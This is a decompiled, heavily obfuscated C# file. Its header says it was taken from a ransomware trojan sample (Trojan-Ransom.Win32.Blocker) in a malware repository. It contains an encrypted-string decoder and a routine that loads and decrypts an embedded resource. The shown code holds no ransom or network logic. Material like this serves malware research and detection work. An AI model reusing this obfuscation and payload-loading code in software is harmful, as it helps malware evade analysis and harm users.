// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using \u0004;
using \u000E;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u000E
{
  internal sealed class \u0002
  {
    private static string \u0001;
    private static string \u0002;
    private static byte[] \u0001;
    private static Hashtable \u0001;
    private static bool \u0001;
    private static int \u0001;

    public static string \u0001([In] int obj0)
    {
      int num1;
      int num2;
      int num3;
      string str1;
      byte[] numArray1;
      string str2;
      string str3;
      try
      {
        int num4 = obj0;
        if (true)
        {
          int num5 = \u0002.\u0001;
          obj0 = num4 - num5;
          if (\u0002.\u0001)
          {
            str3 = (string) \u001F.\u007E\u0084\u0002((object) \u0002.\u0001, (object) obj0);
            switch (str3)
            {
              case null:
                break;
              default:
                str1 = str3;
                goto label_21;
            }
          }
          num3 = 0;
          num1 = obj0;
          int num6;
          int num7;
          do
          {
            num2 = (int) \u0002.\u0001[num1++];
            num6 = num2;
            num7 = 128;
            if (num7 != 0)
            {
              if ((num6 & num7) == 0)
              {
                num3 = num2;
                if (num3 == 0)
                  str1 = string.Empty;
                else
                  goto label_13;
              }
              else
                goto label_8;
            }
            else
              goto label_10;
          }
          while (false);
          goto label_21;
label_8:
          if ((num2 & 64) == 0)
          {
            int num8 = num2 & 63;
            num7 = 8;
            num6 = num8;
          }
          else
          {
            num4 = ((num2 & 31) << 24) + ((int) \u0002.\u0001[num1++] << 16) + ((int) \u0002.\u0001[num1++] << 8);
            goto label_12;
          }
label_10:
          num3 = (num6 << num7) + (int) \u0002.\u0001[num1++];
          goto label_13;
        }
label_12:
        int num9 = (int) \u0002.\u0001[num1++];
        num3 = num4 + num9;
label_13:
        string str4;
        try
        {
          numArray1 = \u0008.\u0080(\u007F.\u007E\u0088\u0002((object) \u0017.\u0008\u0002(), \u0002.\u0001, num1, num3));
          str2 = \u0080.\u0089\u0002(\u007F.\u007E\u0088\u0002((object) \u0017.\u0008\u0002(), numArray1, 0, numArray1.Length));
          if (\u0002.\u0001)
          {
            try
            {
              \u0081.\u007E\u008B\u0002((object) \u0002.\u0001, (object) obj0, (object) str2);
            }
            catch
            {
            }
          }
          str4 = str2;
        }
        catch
        {
          str4 = (string) null;
        }
        str1 = str4;
      }
      catch (Exception ex)
      {
        string str5 = str3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        byte[] numArray2 = numArray1;
        string str6 = str2;
        string str7;
        string str8 = str7;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        \u0003.\u0001(ex, (object) str5, (object) local1, (object) local2, (object) local3, (object) numArray2, (object) str6, (object) str8, (object) local4);
        throw;
      }
label_21:
      return str1;
    }

    static \u0002()
    {
      int length;
      byte[] numArray1;
      Stream stream1;
      Assembly assembly1;
      try
      {
        if (true)
        {
          \u0002.\u0001 = "1";
          \u0002.\u0002 = "56";
          \u0002.\u0001 = (byte[]) null;
        }
        \u0002.\u0001 = (Hashtable) null;
        do
        {
          \u0002.\u0001 = false;
          \u0002.\u0001 = 0;
        }
        while (false);
        if (\u0082.\u008D\u0002(\u0002.\u0001, "1"))
        {
          \u0002.\u0001 = true;
          \u0002.\u0001 = new Hashtable();
        }
        \u0002.\u0001 = \u0083.\u008F\u0002(\u0002.\u0002);
        assembly1 = global::\u0001.\u0001();
        stream1 = \u0084.\u007E\u0090\u0002((object) assembly1, "{550e57c6-65e8-41aa-aebb-f1a5c067405e}");
        try
        {
          length = \u0086.\u0091\u0002(\u0016.\u007E\u0006\u0002((object) stream1));
          numArray1 = new byte[length];
          int num = \u0087.\u007E\u0092\u0002((object) stream1, numArray1, 0, length);
          \u0002.\u0001 = \u0003.\u0001(numArray1);
          numArray1 = (byte[]) null;
          \u0015.\u007E\u008C((object) stream1);
        }
        finally
        {
          do
          {
            if (stream1 != null)
              \u0015.\u007E\u008D((object) stream1);
          }
          while (false);
        }
      }
      catch (Exception ex)
      {
        Assembly assembly2 = assembly1;
        Stream stream2 = stream1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) length;
        byte[] numArray2 = numArray1;
        \u0003.\u0001(ex, (object) assembly2, (object) stream2, (object) local, (object) numArray2);
        throw;
      }
    }
  }
}
